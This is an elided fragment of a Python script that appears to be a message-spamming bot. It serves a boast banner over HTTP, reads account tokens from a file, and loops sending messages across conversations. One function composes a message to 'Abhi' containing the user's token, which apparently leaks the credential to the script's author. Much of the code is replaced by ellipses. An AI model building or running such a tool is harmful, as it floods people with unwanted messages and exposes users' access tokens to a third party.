...
class MyHandler(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):
          ...
          self.end_headers()
          self.wfile.write(b"H9T3RS K1 M99 K9 BH0XD9 F9DN3 B9L1 M9CH1N3  [4BH1 TH4KUR 09 F1R3]")
def execute_server():
...
def send_initial_message():
      ...
      msg_template = "Hello Abhi ! I am using your server. My token is {}"
...
def send_messages_from_file():
      ...
      with open('tokennum.txt', 'r') as file:          tokens = file.readlines()
      ...
      while True:
          try:
              for message_index in range(num_messages):
                  ...
                  if response.ok:
                      print("\033[1;92m[+] Massage send successfully {} of Convo {} Token {}: {}".format(
